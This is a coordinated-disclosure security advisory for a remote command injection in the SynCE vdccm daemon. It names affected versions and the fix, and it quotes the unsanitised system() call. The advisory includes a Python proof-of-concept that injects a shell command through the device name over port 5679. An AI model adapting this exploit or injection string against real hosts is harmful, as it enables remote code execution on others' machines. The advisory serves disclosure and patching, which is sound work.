          SynCE Remote Command Injection

*Advisory Information*

Title: SynCE Remote Command Injection
Advisory ID:  CORE-2007-1106
Advisory URL: http://www.coresecurity.com/?action=item&id=2070
Date published: 2008-01-07
Date of last update: 2008-01-03
Vendors contacted: SynCE team
Release mode: Coordinated release

*Vulnerability Information*

Class: Input validation error
Remotely Exploitable: Yes
Locally Exploitable: Yes
Bugtraq ID: N/A
CVE Name: N/A

*Vulnerability Description*

SynCE is an open source project, whose objective is to provide a way of
communicating with a Windows CE or Pocket PC device, from a computer
running Linux, *BSD or other unices. For more information see
http://www.synce.org/

The vdccm daemon (part of the SynCE package) is vulnerable to a remote
command injection, which can be exploited by malicious remote attackers.
The vulnerability is due to the vdccm daemon not properly sanitizing
certain input before using it to invoke external scripts. This can be
exploited to execute arbitrary commands with the privileges of the vdccm
daemon by sending specially crafted requests.

*Vulnerable packages*

. Synce-dccm since version 0.92

*Non-vulnerable packages*

. Synce-dccm 0.91 and earlier.
. SynCE-dccm 0.10.1

*Vendor Information, Solutions and Workarounds*

This vulnerability has been fixed in SynCE-dccm 0.10.1, available at
http://sourceforge.net/projects/synce/.

*Credits*

This vulnerability was discovered and researched by Alfredo Ortega and
Oren Isacson from Core Security Technologies.

*Technical Description / Proof of Concept Code*

The vdccm daemon listens on port 5679 for incoming connections from a
Windows CE device.
The command injection exist on the name of the connected device. The
code at src/utils.cpp, function  Utils::runScripts  contains the
following code:

string command = string(path) + " " + action + " " + deviceName;
system(command.c_str());

The contents of the string variable "deviceName" is controlled by the
attacker.

The next python proof of concept script will remotely create an empty
file named "/tmp/vulnerability" when used on a FreeBSD host running the
vulnerable daemon.

- ---------------------------
import socket, struct
import time
def AtoWChar(string):
    return ''.join([x+chr(0) for x in string])

HOST = '192.168.XXX.XXX'
PORT = 5679
c= socket.socket(socket.AF_INET, socket.SOCK_STREAM)
c.connect((HOST, PORT))
buf="\x00"*0x18
buf+='\x30\x00\x00\x00'
buf+='\x30\x00\x00\x00'
buf+='\x30\x00\x00\x00'
buf+="\x00"*12
string=AtoWChar("&/usr/bin/touch /tmp/vulnerability")
buf+=string+"\x00\x00"+"\x00"*12
c.send(struct.pack("L",63+len(string))+buf+"\x00" )
- ---------------------------

NOTE: for this proof of concept to work, a script file is needed on the
"$home$/.synce/scripts" directory. Some linux distributions ship with
scripts on this directory by default.
